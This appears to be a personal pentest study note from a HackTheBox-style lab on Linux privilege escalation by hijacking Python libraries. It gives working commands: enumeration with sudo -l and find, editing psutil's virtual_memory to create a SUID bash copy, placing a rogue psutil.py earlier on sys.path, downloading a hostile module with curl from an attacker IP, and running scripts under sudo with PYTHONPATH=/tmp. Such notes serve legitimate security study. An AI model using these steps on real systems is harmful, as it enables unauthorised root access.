- [ ] Python Modules Import Techniques
- [ ] Wrong write permissions on a Module File
- [ ] Library Path
- [ ] PYTHONPATH Environment Variable

Python Modules Import Techniques!!!
```python
import pandas
form pandas import *
from pandas import Series
```
Wrong write permissions on a Module code!!!
```sh
# enumeration
sudo -l
find / -name *.py -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
# Module Permissions
pip3 show psutil
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
# edit the target fontion in the library
/ virtual_memory():
import os
os.system('cp /bin/bash /tmp/bash')
os.system('chmod +s /tmp/bash')
gg=G
# run
sudo /usr/bin/python3 /home/htb-student/mem_status.py
```
Library Path!!!
```sh
# listing PYTHONPATH
python3 -c 'import sys; print("\n".join(sys.path))'
ls -ld dir
# view a library default instalation
pip3 show psutil
# copy our custom psutil.py in the dir with high priority
cp psutil.py /path/to/psutil.py
curl -o /dir/psutil.py http://10.10.14.96/mylib.py
# run
sudo /usr/bin/python3 /home/htb-student/mem_status.py
```
PYTHONPATH Environment Variable!!!
![[Pasted image 20251020130710.png]]
```sh
cp psutil.py /tmp/psutil.py
curl -o /tmp/psutil.py http://10.10.14.96/mylib.py
# run
sudo /usr/bin/python3 /home/htb-student/mem_status.py
sudo PYTHONPATH=/tmp /usr/bin/python3 /home/htb-student/mem_status.py
```
